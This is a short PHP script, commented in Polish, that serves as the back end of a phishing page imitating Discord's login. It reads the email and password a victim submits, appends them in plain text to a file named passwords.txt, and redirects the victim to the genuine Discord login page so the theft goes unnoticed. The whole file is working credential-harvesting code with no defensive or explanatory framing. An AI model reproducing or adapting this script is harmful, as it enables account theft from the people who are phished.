<?php
$email = $_POST['email'];
$password = $_POST['password'];
$dane = "E-mail: $email Hasło: $password \r \n";
$uchwyt = fopen("passwords.txt", "a");
fwrite($uchwyt, $dane);
fclose($uchwyt);
header("Location: https://discord.com/login");
?>